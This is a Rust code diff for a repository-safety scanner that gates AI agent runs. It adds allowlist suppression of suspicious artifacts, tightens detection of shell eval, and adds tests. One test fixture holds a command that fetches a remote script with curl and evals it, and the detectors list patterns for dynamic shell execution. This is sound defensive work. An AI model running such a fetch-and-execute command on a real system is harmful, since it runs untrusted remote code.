@@ -226,10 +226,14 @@ pub fn agent_gate_from_seed(seed: &str, coverage: AgentGateCoverage) -> AgentGat
 
 pub fn agent_gate_from_seed_with_policy(
     seed: &str,
-    coverage: AgentGateCoverage,
+    mut coverage: AgentGateCoverage,
     policy: &Policy,
 ) -> AgentGateReport {
-    let (findings, policy_actions) = apply_policy(findings_from_seed(seed), policy);
+    let (findings, mut policy_actions) = apply_policy(findings_from_seed(seed), policy);
+    let (suspicious_artifacts, artifact_actions) =
+        apply_policy_to_artifacts(std::mem::take(&mut coverage.suspicious_artifacts), policy);
+    coverage.suspicious_artifacts = suspicious_artifacts;
+    policy_actions.extend(artifact_actions);
     render_agent_gate(&findings, coverage, policy, &policy_actions)
 }
 
@@ -683,6 +687,48 @@ fn policy_match(rule: &PolicyMatcher, finding: &RiskFinding) -> bool {
             .is_none_or(|r| r == finding.rule.as_str())
 }
 
+/// Suspicious artifacts are not `RiskFinding`s (they carry a `reason`, not a
+/// `rule`), but the same `[[allowlist]]` schema is the natural place for a
+/// project to acknowledge a known-benign extensionless script or a synthetic
+/// test fixture. Reuse `PolicyMatcher.rule` to match `artifact.reason`.
+fn apply_policy_to_artifacts(
+    artifacts: Vec<SuspiciousArtifact>,
+    policy: &Policy,
+) -> (Vec<SuspiciousArtifact>, Vec<String>) {
+    let mut actions = Vec::new();
+    let mut out = Vec::new();
+    for artifact in artifacts {
+        if let Some(rule) = policy
+            .allowlist
+            .iter()
+            .find(|rule| policy_match_artifact(rule, &artifact))
+        {
+            actions.push(format!(
+                "suppressed artifact {} at {} by allowlist{}",
+                artifact.reason,
+                artifact.path,
+                policy_reason(rule.reason.as_deref())
+            ));
+            continue;
+        }
+        out.push(artifact);
+    }
+    (out, actions)
+}
+
+fn policy_match_artifact(rule: &PolicyMatcher, artifact: &SuspiciousArtifact) -> bool {
+    rule.path
+        .as_deref()
+        .is_none_or(|path| normalized_path(&artifact.path).contains(&normalized_path(path)))
+        && rule
+            .rule
+            .as_deref()
+            // `reason` may combine multiple comma-joined tags (see
+            // `inspect_suspicious_artifact`), so match against any one tag
+            // rather than the whole joined string.
+            .is_none_or(|r| artifact.reason.split(',').any(|tag| tag == r))
+}
+
 fn policy_override_match(
     rule: &crate::config::PolicySeverityOverride,
     finding: &RiskFinding,
@@ -1090,7 +1136,33 @@ fn looks_like_base64_execute(text: &str) -> bool {
 
 fn looks_like_dynamic_shell_eval(text: &str) -> bool {
     let lower = text.to_ascii_lowercase();
-    lower.contains("eval ") || lower.contains("eval(") || lower.contains("bash -c")
+    looks_like_eval_invocation(&lower) || lower.contains("eval(") || lower.contains("bash -c")
+}
+
+/// `eval` is only a dynamic-execution risk when it is actually invoked like a
+/// shell/JS builtin, e.g. `eval "$(...)"`, `eval $cmd`, `` eval `cmd` ``.
+/// A bare word-boundary match on "eval " also fires on ordinary English/
+/// technical prose such as "eval corpus" (sift's own `eval-corpus` feature)
+/// or "retrieval ", so require a shell-substitution-looking token right
+/// after the word.
+fn looks_like_eval_invocation(lower: &str) -> bool {
+    let mut rest = lower;
+    loop {
+        let Some(pos) = rest.find("eval") else {
+            return false;
+        };
+        let before_ok = pos == 0 || !rest.as_bytes()[pos - 1].is_ascii_alphanumeric();
+        let after = &rest[pos + "eval".len()..];
+        if before_ok
+            && after.starts_with(' ')
+            && after
+                .trim_start_matches(' ')
+                .starts_with(['$', '`', '"', '\''])
+        {
+            return true;
+        }
+        rest = &rest[pos + 1..];
+    }
 }
 
 fn contains_workflow_secret(text: &str) -> bool {
@@ -1723,6 +1795,136 @@ mod tests {
         assert!(findings.iter().any(|f| {
             f.rule == "install-home-write" && f.severity == Severity::High && f.line == Some(3)
         }));
+    }
+
+    #[test]
+    fn flags_real_dynamic_shell_eval_invocation() {
+        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":4,"text":"eval \"$(curl -fsSL https://example.invalid/x.sh)\""}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "dynamic-shell-eval" && f.severity == Severity::Medium && f.line == Some(4)
+        }));
+    }
+
+    #[test]
+    fn ignores_eval_used_as_an_english_word() {
+        // "eval corpus" is sift's own `eval-corpus` feature name written as prose;
+        // it must never be misread as a shell `eval` invocation. Likewise a
+        // completely unrelated English word ("retrieval") must not match.
+        let seed = r#"{"path":"docs/ROADMAP.md","locations":[{"kind":"call","line":5,"text":"policy, artifact inventory, eval corpus, and a data retrieval step"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(
+            !findings.iter().any(|f| f.rule == "dynamic-shell-eval"),
+            "English prose must not trip dynamic-shell-eval: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn policy_allowlist_suppresses_matching_suspicious_artifact() {
+        let coverage = AgentGateCoverage {
+            candidate_files: 3,
+            dehydrated_files: 3,
+            suspicious_artifacts: vec![
+                SuspiciousArtifact {
+                    path: "tests/fixtures/archive-payload/assets/payload.tar.gz".to_string(),
+                    size_bytes: 28,
+                    reason: "binary_or_archive_extension".to_string(),
+                },
+                SuspiciousArtifact {
+                    path: ".githooks/pre-commit".to_string(),
+                    size_bytes: 408,
+                    reason: "extensionless_or_binary_executable".to_string(),
+                },
+            ],
+            ..Default::default()
+        };
+        let policy = Policy {
+            allowlist: vec![PolicyMatcher {
+                path: Some("tests/fixtures/".to_string()),
+                rule: Some("binary_or_archive_extension".to_string()),
+                reason: Some("synthetic regression fixture".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let gate = agent_gate_from_seed_with_policy("", coverage, &policy);
+
+        assert!(
+            gate.markdown
+                .contains("suppressed artifact binary_or_archive_extension"),
+            "expected a POLICY action line: {}",
+            gate.markdown
+        );
+        // The fixture archive was allowlisted, but the unreviewed git hook
+        // was not, so the gate must still surface it and stay cautious.
+        assert!(gate.markdown.starts_with("VERDICT: CAUTION"));
+        assert!(
+            gate.markdown
+                .contains("artifact requires review: .githooks/pre-commit")
+        );
+        assert!(
+            !gate
+                .markdown
+                .contains("artifact requires review: tests/fixtures/archive-payload")
+        );
+    }
+
+    #[test]
+    fn policy_allowlisting_every_artifact_reaches_accept() {
+        let coverage = AgentGateCoverage {
+            candidate_files: 1,
+            dehydrated_files: 1,
+            suspicious_artifacts: vec![SuspiciousArtifact {
+                path: ".githooks/pre-commit".to_string(),
+                size_bytes: 408,
+                reason: "extensionless_or_binary_executable".to_string(),
+            }],
+            ..Default::default()
+        };
+        let policy = Policy {
+            allowlist: vec![PolicyMatcher {
+                path: Some(".githooks/pre-commit".to_string()),
+                rule: Some("extensionless_or_binary_executable".to_string()),
+                reason: Some("known git hook, reviewed".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let gate = agent_gate_from_seed_with_policy("", coverage, &policy);
+
+        assert!(gate.markdown.starts_with("VERDICT: ACCEPT"));
+        assert!(gate.safe_to_agent_run);
+    }
+
+    #[test]
+    fn policy_allowlist_matches_one_tag_within_a_combined_artifact_reason() {
+        // `inspect_suspicious_artifact` joins multiple matched reasons with a
+        // comma (e.g. a large opaque file that is also a binary extension);
+        // an allowlist rule for a single tag must still match.
+        let coverage = AgentGateCoverage {
+            candidate_files: 1,
+            dehydrated_files: 1,
+            suspicious_artifacts: vec![SuspiciousArtifact {
+                path: "vendor/blob.bin".to_string(),
+                size_bytes: 999,
+                reason: "large_opaque_file,binary_or_archive_extension".to_string(),
+            }],
+            ..Default::default()
+        };
+        let policy = Policy {
+            allowlist: vec![PolicyMatcher {
+                path: Some("vendor/".to_string()),
+                rule: Some("binary_or_archive_extension".to_string()),
+                reason: Some("vendored binary, reviewed".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let gate = agent_gate_from_seed_with_policy("", coverage, &policy);
+
+        assert!(gate.markdown.starts_with("VERDICT: ACCEPT"));
     }
 
     #[test]
